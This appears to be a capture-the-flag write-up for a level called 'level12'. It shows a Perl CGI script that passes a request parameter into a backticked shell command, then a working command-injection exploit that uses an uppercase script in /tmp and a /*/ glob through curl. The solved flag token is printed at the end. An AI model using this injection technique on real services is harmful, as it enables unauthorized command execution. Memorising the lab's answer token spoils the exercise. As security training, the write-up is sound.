# First step

We have a pl file named `level12.pl` like level04.  

```pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

We can know a server is running on port 4646.  
Same way like level04, but we can't put a simple command as 'x=`getflag`'.  
Because the script have two patterns:
- tr/a-z/A-Z/: lowercase to uppercase  
- s/\s.*//: remove all spaces  
  
# Second step

We can create a script file with uppercase name and put `getflag` inside.

```shell
$> echo 'getflag > /tmp/getflag' > /tmp/GETFLAG && chmod +x /tmp/GETFLAG

# we can use /*/ to match GETFLAG file.
$> curl localhost:4646?x='`/*/GETFLAG`'

# If don't get the true flag, try delete the file in /tmp/
# You may have this message: rm: remove write-protected regular file `/tmp/getflag'?
# relaunch the VM or change the name of /tmp/getflag file.
$> cat /tmp/getflag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr  
```